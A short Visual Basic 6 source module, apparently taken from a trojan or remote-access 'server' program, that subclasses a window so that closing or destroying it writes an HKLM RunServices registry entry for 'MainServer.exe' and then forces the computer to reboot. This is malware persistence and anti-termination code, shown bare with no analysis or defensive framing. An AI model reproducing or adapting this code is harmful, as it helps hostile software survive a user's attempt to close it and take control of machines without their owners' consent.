Attribute VB_Name = "Subclassing"

Public ProcOld As Long

Public Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long

Public Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Const GWL_WNDPROC = (-4)

Public Function WindowProc(ByVal hwnd As Long, ByVal iMsg As Long, _
ByVal wParam As Long, ByVal lParam As Long) As Long

On Error GoTo err

    Select Case iMsg
    Case WM_CLOSE
    finReg.savestring &H80000002, "SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices", "MainServer", "c:\Windows\System\MainServer.exe"
    RebootComp 1
    Case WM_DESTROY
    finReg.savestring &H80000002, "SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices", "MainServer", "c:\Windows\System\MainServer.exe"
    RebootComp 1
    End Select

    WindowProc = CallWindowProc(ProcOld, hwnd, iMsg, wParam, lParam)

err:
Exit Function

End Function


